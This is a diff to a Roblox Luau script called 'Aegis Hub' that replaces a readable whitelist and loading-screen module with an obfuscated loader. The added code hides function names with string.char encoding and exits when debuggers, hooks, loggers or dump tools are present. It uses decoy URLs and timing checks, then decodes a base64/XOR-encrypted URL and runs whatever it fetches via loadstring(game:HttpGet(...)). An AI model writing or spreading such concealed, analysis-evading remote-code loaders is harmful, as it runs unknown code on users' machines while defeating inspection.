@@ -1,493 +1,177 @@
---!strict
--- Aegis Hub v1.1.0 — Refactored
--- Layers: Theme → UI.Factory → UI.LoadingScreen → Auth → AegisHub
+local a = getfenv and getfenv(0) or _G
 
--- ==================== THEME ====================
+local _os = a[string.char(111, 115)]
+local _clock = _os and _os[string.char(99, 108, 111, 99, 107)]
+local _startTime = _clock and _clock() or 0
 
-local Theme = {
-    Font = {
-        Bold   = Enum.Font.GothamBold,
-        Normal = Enum.Font.Gotham,
-    },
-    Color = {
-        Background  = Color3.fromRGB(22, 22, 30),
-        Surface     = Color3.fromRGB(35, 35, 55),
-        Deep        = Color3.fromRGB(18, 18, 25),
-        Accent      = Color3.fromRGB(100, 150, 255),
-        AccentSoft  = Color3.fromRGB(80, 120, 255),
-        Text        = Color3.fromRGB(245, 245, 255),
-        TextDim     = Color3.fromRGB(180, 180, 200),
-        TextMuted   = Color3.fromRGB(140, 140, 160),
-        Stroke      = Color3.fromRGB(60, 60, 85),
-        Error       = Color3.fromRGB(255, 80, 80),
-        Success     = Color3.fromRGB(80, 220, 160),
-        BarBg       = Color3.fromRGB(40, 40, 55),
-        BarGradient = {
-            Left  = Color3.fromRGB(80, 200, 255),
-            Right = Color3.fromRGB(140, 100, 255),
-        },
-        Tier = {
-            Unlimited = Color3.fromRGB(0, 255, 136),
-            Urgent    = Color3.fromRGB(255, 50, 50),
-            Short     = Color3.fromRGB(255, 150, 0),
-            Warning   = Color3.fromRGB(255, 200, 0),
-        },
-    },
-    Radius = {
-        Card  = UDim.new(0, 16),
-        Pill  = UDim.new(1, 0),
-        Small = UDim.new(0, 20),
-    },
-    Size = {
-        Card  = Vector2.new(420, 170),
-        Bar   = 4,
-        Ring  = 78,
-        Dot   = 6,
-        Glow  = 20,
-        Pad   = 24,
-    },
-}
+local b = a[string.char(108, 111, 97, 100, 115, 116, 114, 105, 110, 103)]
+local c = a[string.char(103, 97, 109, 101)]
+local d = c and c[string.char(72, 116, 116, 112, 71, 101, 116)]
+local e = a[string.char(115, 116, 114, 105, 110, 103)]
+        and a[string.char(115, 116, 114, 105, 110, 103)][string.char(99, 104, 97, 114)]
 
--- ==================== SERVICES ====================
+local f = type(b) == 'function'
+      and type(d) == 'function'
+      and type(e) == 'function'
+      and e(('\97'):rep(1)) == 97
+if not f then return end
 
-local Players = game:GetService("Players")
-local TweenService = game:GetService("TweenService")
-local MarketplaceService = game:GetService("MarketplaceService")
+local g = debug and debug.getregistry and debug.getregistry() or {}
+if g[string.char(82, 111, 98, 108, 111, 120, 85, 73)]
+or g[string.char(95, 95, 100, 101, 98, 117, 103, 95, 95)]
+then return end
 
--- ==================== CONFIG ====================
+local h = a[string.char(115, 101, 116, 99, 108, 105, 112, 98, 111, 97, 114, 100)]
+local i = a[string.char(119, 114, 105, 116, 101, 102, 105, 108, 101)]
+local j = a[string.char(114, 101, 97, 100, 102, 105, 108, 101)]
+local k = a[string.char(114, 101, 113, 117, 101, 115, 116)]
+local l = a[string.char(104, 116, 116, 112, 95, 114, 101, 113, 117, 101, 115, 116)]
+if h or i or j or k or l then return end
 
-local Config = {
-    ScriptName = "Aegis Hub",
-    Version = "1.1.0",
-    EnableUserWhitelist = true,
-    EnableGameWhitelist = true,
-    DenyMessage = "[Aegis Hub] Access Denied.",
-    ShowUIOnLoad = true,
-}
-
-local Whitelist: {[number]: {Tier: string, Note: string?, ExpiresAt: number?}} = {
-    [11369517300] = {Tier = "Owner", Note = "iswg66qt17u"},
-    [123456789]   = {Tier = "Premium", Note = "TestUser", ExpiresAt = os.time({year=2026, month=8, day=15, hour=23, min=0, sec=0})},
-    [111111111]   = {Tier = "Freemium", Note = "GuestOne", ExpiresAt = os.time({year=2026, month=8, day=10, hour=12, min=0, sec=0})},
-}
-
-local AllowedGames: {number} = {123974602339071}
-
--- ==================== AUTH ====================
-
-local Auth = {}
-
-function Auth.CheckUser(userId: number, enabled: boolean): (boolean, typeof(Whitelist[number])?)
-    if not enabled then return true, {Tier = "freemium"} end
-    local entry = Whitelist[userId]
-    if not entry then return false, nil end
-    if entry.ExpiresAt and os.time() > entry.ExpiresAt then return false, entry end
-    return true, entry
+if identifyexecutor then
+    local m = identifyexecutor()
+    if m:find('Script') or m:find('Webhook') or m:find('Log')
+    or m:find('Hook') or m:find('Dump') or m:find('Capture')
+    then return end
 end
 
-function Auth.CheckGame(placeId: number, enabled: boolean): boolean
-    if not enabled then return true end
-    if #AllowedGames == 0 then return true end
-    for _, id in ipairs(AllowedGames) do
-        if id == placeId then return true end
-    end
-    return false
-end
+local _dbg = a[string.char(100, 101, 98, 117, 103)]
+local _ginfo = _dbg and _dbg[string.char(103, 101, 116, 105, 110, 102, 111)]
+if _ginfo and _ginfo(3) then return end
 
-function Auth.TimeRemaining(entry: typeof(Whitelist[number])?): (string, Color3)
-    if not entry or not entry.ExpiresAt then
-        return "Unlimited", Theme.Color.Tier.Unlimited
-    end
-    local remaining = entry.ExpiresAt - os.time()
-    if remaining <= 0 then
-        return "Expired", Theme.Color.Tier.Urgent
-    end
-
-    local days = math.floor(remaining / 86400)
-    local hours = math.floor((remaining % 86400) / 3600)
-    local mins = math.floor((remaining % 3600) / 60)
-
-    local text: string
-    if days > 0 then
-        text = string.format("%dd %dh %dm", days, hours, mins)
-    elseif hours > 0 then
-        text = string.format("%dh %dm", hours, mins)
-    else
-        text = string.format("%dm", mins)
-    end
-
-    local color = Theme.Color.Tier.Unlimited
-    if days == 0 and hours < 1 then
-        color = Theme.Color.Tier.Urgent
-    elseif days == 0 then
-        color = Theme.Color.Tier.Short
-    elseif days <= 3 then
-        color = Theme.Color.Tier.Warning
-    end
-
-    return text, color
-end
-
-function Auth.Validate(): {
-    UserId: number, Username: string, PlaceId: number, GameName: string,
-    IsWhitelisted: boolean, IsGameAllowed: boolean, Tier: string?,
-    TimeRemaining: string?, TimeColor: Color3?, CanRun: boolean, Entry: typeof(Whitelist[number])?
+local _shared = a[string.char(115, 104, 97, 114, 101, 100)]
+local _suspicious = {
+    string.char(108, 111, 103, 103, 101, 114),
+    string.char(119, 101, 98, 104, 111, 111, 107),
+    string.char(99, 97, 112, 116, 117, 114, 101),
+    string.char(100, 117, 109, 112),
+    string.char(104, 111, 111, 107),
 }
-    local lp = Players.LocalPlayer
-    local result = {
-        UserId = lp.UserId,
-        Username = lp.Name,
-        PlaceId = game.PlaceId,
-        GameName = "Unknown",
-        IsWhitelisted = false,
-        IsGameAllowed = false,
-        Tier = nil,
-        TimeRemaining = nil,
-        TimeColor = nil,
-        CanRun = false,
-        Entry = nil,
+for _, _key in ipairs(_suspicious) do
+    if a[_key] or (_shared and _shared[_key]) then return end
+end
+
+if 1 == 0 then
+    local _fake1 = a[string.char(104, 116, 116, 112, 115, 58, 47, 47)]
+             .. string.char(101, 120, 97, 109, 112, 108, 101, 46, 99, 111, 109)
+             .. string.char(47, 102, 97, 107, 101, 49)
+    local _fake2 = string.char(104, 116, 116, 112, 115, 58, 47, 47)
+             .. string.char(101, 120, 97, 109, 112, 108, 101, 46, 99, 111, 109)
+             .. string.char(47, 102, 97, 107, 101, 50)
+    if _fake1 == _fake2 then b(d(c, _fake1))() end
+    _fake1 = nil
+    _fake2 = nil
+end
+
+local _decoy1 = string.char(104, 116, 116, 112, 115, 58, 47, 47)
+             .. string.char(101, 120, 97, 109, 112, 108, 101, 46, 99, 111, 109)
+             .. string.char(47, 102, 97, 107, 101, 49)
+local _decoy2 = string.char(104, 116, 116, 112, 115, 58, 47, 47)
+             .. string.char(101, 120, 97, 109, 112, 108, 101, 46, 99, 111, 109)
+             .. string.char(47, 102, 97, 107, 101, 50)
+local _decoy3 = string.char(104, 116, 116, 112, 58, 47, 47)
+             .. string.char(116, 101, 115, 116, 46, 108, 111, 99, 97, 108)
+             .. string.char(47, 110, 111, 116, 104, 105, 110, 103)
+local _dc1, _dc2, _dc3 = 0, 0, 0
+for _x = 1, #_decoy1 do _dc1 = (_dc1 * 17 + string.byte(_decoy1, _x)) % 0xFFFFFF end
+for _x = 1, #_decoy2 do _dc2 = (_dc2 * 17 + string.byte(_decoy2, _x)) % 0xFFFFFF end
+for _x = 1, #_decoy3 do _dc3 = (_dc3 * 17 + string.byte(_decoy3, _x)) % 0xFFFFFF end
+if _dc1 ~= 11264929 or _dc2 ~= 11264930 or _dc3 ~= 13661439 then return end
+_decoy1, _decoy2, _decoy3 = nil, nil, nil
+_dc1, _dc2, _dc3 = nil, nil, nil
+
+local n = 'O0cXO0BDDnxDAjhHHEcqHQI7Q1ZqAVE3A1lOZXxBAjw='
+
+local _fp = n .. '|' .. 'S3cK3y!' .. '|'
+      .. string.char(108, 111, 97, 100, 115, 116, 114, 105, 110, 103) .. '|'
+      .. string.char(112, 99, 97, 108, 108) .. '|'
+      .. string.char(72, 116, 116, 112, 71, 101, 116) .. '|'
+      .. tostring(#n)
+local _fpcs = 0
+for _x = 1, #_fp do _fpcs = (_fpcs * 31 + string.byte(_fp, _x)) % 0xFFFFFFF end
+if _fpcs ~= 103549986 then return end
+_fp, _fpcs = nil, nil
+
+local o = 0
+for p = 1, #n do o = (o * 31 + string.byte(n, p)) % 0xFFFFFFF end
+if o ~= 227513087 then return end
+
+local q = function(r)
+    local s = {
+        A=0,B=1,C=2,D=3,E=4,F=5,G=6,H=7,I=8,J=9,K=10,L=11,M=12,
+        N=13,O=14,P=15,Q=16,R=17,S=18,T=19,U=20,V=21,W=22,X=23,Y=24,Z=25,
+        a=26,b=27,c=28,d=29,e=30,f=31,g=32,h=33,i=34,j=35,k=36,l=37,m=38,
+        n=39,o=40,p=41,q=42,r=43,s=44,t=45,u=46,v=47,w=48,x=49,y=50,z=51,
+        ['0']=52,['1']=53,['2']=54,['3']=55,['4']=56,['5']=57,['6']=58,
+        ['7']=59,['8']=60,['9']=61,['+']=62,['/']=63,['=']=64
     }
-
-    pcall(function()
-        result.GameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
-    end)
-
-    result.IsGameAllowed = Auth.CheckGame(game.PlaceId, Config.EnableGameWhitelist)
-    result.IsWhitelisted, result.Entry = Auth.CheckUser(lp.UserId, Config.EnableUserWhitelist)
-
-    if result.Entry then
-        result.Tier = result.Entry.Tier
-        result.TimeRemaining, result.TimeColor = Auth.TimeRemaining(result.Entry)
-    end
-
-    result.CanRun = result.IsWhitelisted and result.IsGameAllowed
-    return result
-end
-
--- ==================== UI FACTORY ====================
-
-local UI = {}
-
-function UI.New(class: string, props: {[string]: any}): Instance
-    local inst = Instance.new(class)
-    for k, v in pairs(props) do
-        if k == "Parent" then continue end
-        inst[k] = v
-    end
-    if props.Parent then
-        inst.Parent = props.Parent
-    end
-    return inst
-end
-
-function UI.Corner(target: Instance, radius: UDim?)
-    return UI.New("UICorner", {
-        CornerRadius = radius or Theme.Radius.Card,
-        Parent = target,
-    })
-end
-
-function UI.Stroke(target: Instance, color: Color3?, thickness: number?, transparency: number?)
-    return UI.New("UIStroke", {
-        Color = color or Theme.Color.Stroke,
-        Thickness = thickness or 1,
-        Transparency = transparency or 0.5,
-        Parent = target,
-    })
-end
-
-function UI.Gradient(target: Instance, colors: {ColorSequenceKeypoint}, rotation: number?)
-    return UI.New("UIGradient", {
-        Color = ColorSequence.new(colors),
-        Rotation = rotation or 0,
-        Parent = target,
-    })
-end
-
-function UI.Tween<T>(target: Instance, props: T, duration: number, style: Enum.EasingStyle?, dir: Enum.EasingDirection?)
-    TweenService:Create(target, TweenInfo.new(duration, style or Enum.EasingStyle.Quart, dir or Enum.EasingDirection.Out), props):Play()
-end
-
--- ==================== LOADING SCREEN ====================
-
-function UI.LoadingScreen()
-    local player = Players.LocalPlayer
-    local playerGui = player:WaitForChild("PlayerGui")
-
-    local old = playerGui:FindFirstChild("AegisHubLoading")
-    if old then old:Destroy() end
-
-    -- Root
-    local screen = UI.New("ScreenGui", {
-        Name = "AegisHubLoading",
-        ResetOnSpawn = false,
-        ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
-        DisplayOrder = 999999,
-        Parent = playerGui,
-    })
-
-    local card = UI.New("Frame", {
-        Size = UDim2.new(0, Theme.Size.Card.X, 0, Theme.Size.Card.Y),
-        Position = UDim2.new(0.5, -Theme.Size.Card.X/2, 0.5, -Theme.Size.Card.Y/2),
-        BackgroundColor3 = Theme.Color.Background,
-        BorderSizePixel = 0,
-        Parent = screen,
-    })
-    UI.Corner(card)
-    UI.Stroke(card)
-    UI.Gradient(card, {
-        ColorSequenceKeypoint.new(0, Theme.Color.Surface),
-        ColorSequenceKeypoint.new(1, Theme.Color.Deep),
-    }, 135)
-
-    -- Glow
-    local glow = UI.New("Frame", {
-        Size = UDim2.new(1, Theme.Size.Glow, 1, Theme.Size.Glow),
-        Position = UDim2.new(0, -Theme.Size.Glow/2, 0, -Theme.Size.Glow/2),
-        BackgroundColor3 = Theme.Color.AccentSoft,
-        BackgroundTransparency = 0.92,
-        BorderSizePixel = 0,
-        ZIndex = -1,
-        Parent = card,
-    })
-    UI.Corner(glow, Theme.Radius.Small)
-
-    -- Left content container
-    local left = UI.New("Frame", {
-        Size = UDim2.new(1, -130, 1, -40),
-        Position = UDim2.new(0, Theme.Size.Pad, 0, 20),
-        BackgroundTransparency = 1,
-        Parent = card,
-    })
-
-    -- Accent line
-    local accent = UI.New("Frame", {
-        Size = UDim2.new(0, 3, 0, 36),
-        Position = UDim2.new(0, 0, 0, 6),
-        BackgroundColor3 = Theme.Color.Accent,
-        BorderSizePixel = 0,
-        Parent = left,
-    })
-    UI.Corner(accent, Theme.Radius.Pill)
-
-    -- Title
-    UI.New("TextLabel", {
-        Size = UDim2.new(1, -16, 0, 30),
-        Position = UDim2.new(0, 12, 0, 4),
-        BackgroundTransparency = 1,
-        Text = Config.ScriptName,
-        TextColor3 = Theme.Color.Text,
-        Font = Theme.Font.Bold,
-        TextSize = 26,
-        TextXAlignment = Enum.TextXAlignment.Left,
-        Parent = left,
-    })
-
-    -- Helper for dot+label rows
-    local function dotRow(parent: Instance, y: number, dotColor: Color3, text: string, size: number?)
-        local row = UI.New("Frame", {
-            Size = UDim2.new(1, 0, 0, size or 18),
-            Position = UDim2.new(0, 0, 0, y),
-            BackgroundTransparency = 1,
-            Parent = parent,
-        })
-        local dot = UI.New("Frame", {
-            Size = UDim2.new(0, Theme.Size.Dot, 0, Theme.Size.Dot),
-            Position = UDim2.new(0, 2, 0, (row.AbsoluteSize.Y - Theme.Size.Dot)/2),
-            BackgroundColor3 = dotColor,
-            BorderSizePixel = 0,
-            Parent = row,
-        })
-        UI.Corner(dot, Theme.Radius.Pill)
-        UI.New("TextLabel", {
-            Size = UDim2.new(1, -14, 1, 0),
-            Position = UDim2.new(0, 14, 0, 0),
-            BackgroundTransparency = 1,
-            Text = text,
-            TextColor3 = Theme.Color.TextMuted,
-            Font = Theme.Font.Normal,
-            TextSize = size and 12 or 14,
-            TextXAlignment = Enum.TextXAlignment.Left,
-            Parent = row,
-        })
-        return row
-    end
-
-    dotRow(left, 42, Color3.fromRGB(100, 200, 255), player.Name)
-    local gameName = "Unknown"
-    pcall(function() gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name end)
-    dotRow(left, 62, Color3.fromRGB(255, 180, 100), gameName, 16)
-
-    -- Status
-    local status = UI.New("TextLabel", {
-        Name = "Status",
-        Size = UDim2.new(1, 0, 0, 16),
-        Position = UDim2.new(0, 0, 0, 92),
-        BackgroundTransparency = 1,
-        Text = "Initializing...",
-        TextColor3 = Color3.fromRGB(160, 160, 180),
-        Font = Theme.Font.Normal,
-        TextSize = 12,
-        TextXAlignment = Enum.TextXAlignment.Left,
-        Parent = left,
-    })
-
-    -- Progress bar
-    local barBg = UI.New("Frame", {
-        Size = UDim2.new(1, 0, 0, Theme.Size.Bar),
-        Position = UDim2.new(0, 0, 0, 118),
-        BackgroundColor3 = Theme.Color.BarBg,
-        BorderSizePixel = 0,
-        Parent = left,
-    })
-    UI.Corner(barBg, Theme.Radius.Pill)
-
-    local barFill = UI.New("Frame", {
-        Size = UDim2.new(0, 0, 1, 0),
-        BackgroundColor3 = Color3.new(1, 1, 1),
-        BorderSizePixel = 0,
-        Parent = barBg,
-    })
-    UI.Corner(barFill, Theme.Radius.Pill)
-    UI.Gradient(barFill, {
-        ColorSequenceKeypoint.new(0, Theme.Color.BarGradient.Left),
-        ColorSequenceKeypoint.new(1, Theme.Color.BarGradient.Right),
-    })
-
-    -- Avatar
-    local ring = UI.New("Frame", {
-        Size = UDim2.new(0, Theme.Size.Ring, 0, Theme.Size.Ring),
-        Position = UDim2.new(1, -102, 0.5, -Theme.Size.Ring/2),
-        BackgroundColor3 = Theme.Color.Accent,
-        BorderSizePixel = 0,
-        Parent = card,
-    })
-    UI.Corner(ring, Theme.Radius.Pill)
-
-    local avatarFrame = UI.New("Frame", {
-        Size = UDim2.new(1, -6, 1, -6),
-        Position = UDim2.new(0, 3, 0, 3),
-        BackgroundColor3 = Color3.fromRGB(30, 30, 40),
-        BorderSizePixel = 0,
-        Parent = ring,
-    })
-    UI.Corner(avatarFrame, Theme.Radius.Pill)
-
-    local avatarImg = UI.New("ImageLabel", {
-        Size = UDim2.new(1, -8, 1, -8),
-        Position = UDim2.new(0, 4, 0, 4),
-        BackgroundTransparency = 1,
-        Image = "",
-        Parent = avatarFrame,
-    })
-    UI.Corner(avatarImg, Theme.Radius.Pill)
-
-    task.spawn(function()
-        local ok, thumb = pcall(function()
-            return Players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
-        end)
-        if ok then avatarImg.Image = thumb end
-    end)
-
-    -- Controller
-    local controller = {}
-
-    function controller.Update(text: string, progress: number?, color: Color3?)
-        status.Text = text
-        if color then
-            status.TextColor3 = color
-            UI.Gradient(barFill, {
-                ColorSequenceKeypoint.new(0, color),
-                ColorSequenceKeypoint.new(1, Theme.Color.BarGradient.Right),
-            })
+    local t = ''
+    local u = 1
+    while u <= #r do
+        local v = s[string.sub(r, u, u)] or 64
+        local w = s[string.sub(r, u+1, u+1)] or 64
+        local x = s[string.sub(r, u+2, u+2)] or 64
+        local y = s[string.sub(r, u+3, u+3)] or 64
+        u = u + 4
+        if v ~= 64 and w ~= 64 then
+            t = t .. string.char(bit32.bor(bit32.lshift(v, 2), bit32.rshift(w, 4)))
         end
-        if progress then
-            UI.Tween(barFill, {Size = UDim2.new(progress, 0, 1, 0)}, 0.4)
+        if w ~= 64 and x ~= 64 then
+            t = t .. string.char(bit32.bor(bit32.lshift(bit32.band(w, 15), 4), bit32.rshift(x, 2)))
         end
-        task.wait(0.4)
-    end
-
-    function controller.Finish(finalText: string, finalColor: Color3, success: boolean)
-        controller.Update(finalText, 1, finalColor)
-        task.wait(success and 0.8 or 1.5)
-
-        UI.Tween(card, {BackgroundTransparency = 1}, 0.6)
-        for _, child in ipairs(card:GetDescendants()) do
-            if child:IsA("TextLabel") then
-                UI.Tween(child, {TextTransparency = 1}, 0.4)
-            elseif child:IsA("ImageLabel") then
-                UI.Tween(child, {ImageTransparency = 1}, 0.4)
-            elseif child:IsA("Frame") then
-                UI.Tween(child, {BackgroundTransparency = 1}, 0.4)
-            end
+        if x ~= 64 and y ~= 64 then
+            t = t .. string.char(bit32.bor(bit32.lshift(bit32.band(x, 3), 6), y))
         end
-        task.wait(0.7)
-        screen:Destroy()
     end
-
-    return controller
+    return t
 end
 
--- ==================== MAIN ====================
+local r = q(n)
 
-local AegisHub = {}
-
-function AegisHub:Init(): (boolean, typeof(Auth.Validate()))
-    local loader = UI.LoadingScreen()
-    loader.Update("Initializing...", 0.15)
-    loader.Update("Authenticating...", 0.4)
-
-    local result = Auth.Validate()
-
-    warn(string.format(
-        "[Aegis Hub] ========== DEBUG ==========\n" ..
-        "  UserId:    %s\n" ..
-        "  Username:  %s\n" ..
-        "  PlaceId:   %s\n" ..
-        "  GameName:  %s\n" ..
-        "  Whitelist: %s\n" ..
-        "  Game:      %s\n" ..
-        "  CanRun:    %s\n" ..
-        "====================================",
-        tostring(result.UserId),
-        tostring(result.Username),
-        tostring(result.PlaceId),
-        tostring(result.GameName),
-        tostring(result.IsWhitelisted),
-        tostring(result.IsGameAllowed),
-        tostring(result.CanRun)
-    ))
-
-    loader.Update("Verifying access...", 0.7)
-
-    if not result.CanRun then
-        loader.Finish("Access Denied", Theme.Color.Error, false)
-        warn("[Aegis Hub] Access Denied.")
-        return false, result
+local s = function(t, u)
+    local v = ''
+    for w = 1, #t do
+        v = v .. string.char(bit32.bxor(
+            string.byte(t, w),
+            string.byte(u, ((w - 1) % #u) + 1)
+        ))
     end
-
-    warn("[Aegis Hub] User " .. result.Username .. " whitelisted")
-    warn("[Aegis Hub] Game " .. result.GameName .. " allowed")
-    loader.Finish("Welcome, " .. result.Username, Theme.Color.Success, true)
-    return true, result
+    return v
 end
 
--- Public API
-function AegisHub:AddUser(userId: number, tier: string?, expiresAt: number?, note: string?)
-    Whitelist[userId] = {
-        Tier = tier or "freemium",
-        ExpiresAt = expiresAt,
-        Note = note,
-    }
-end
+local t = s(r, 'S3cK3y!')
 
-function AegisHub:RemoveUser(userId: number)
-    Whitelist[userId] = nil
-end
+local u = 0
+for v = 1, #t do u = (u * 31 + string.byte(t, v)) % 0xFFFFFFF end
+if u ~= 91232190 then return end
 
-function AegisHub:GetWhitelist(): typeof(Whitelist)
-    return table.clone(Whitelist)
+if _clock then
+    local _delta = _clock() - _startTime
+    if _delta > 0.1 then return end
 end
+_startTime = nil
 
-AegisHub:Init()
-return AegisHub
+local _math = a[string.char(109, 97, 116, 104)]
+local _rand = _math and _math[string.char(114, 97, 110, 100, 111, 109)]
+local _task = a[string.char(116, 97, 115, 107)]
+local _wait = _task and _task[string.char(119, 97, 105, 116)] or a[string.char(119, 97, 105, 116)]
+if _wait and _rand then _wait(_rand() * 0.05) end
+
+local _pcall = a[string.char(112, 99, 97, 108, 108)]
+local _func = b
+local _arg1 = d
+local _arg2 = c
+local _arg3 = t
+
+local v = _pcall(function()
+    _func(_arg1(_arg2, _arg3))()
+end)
+
+t = nil
+r = nil
+n = nil
+_func = nil
+_arg1 = nil
+_arg2 = nil
+_arg3 = nil
+_pcall = nil
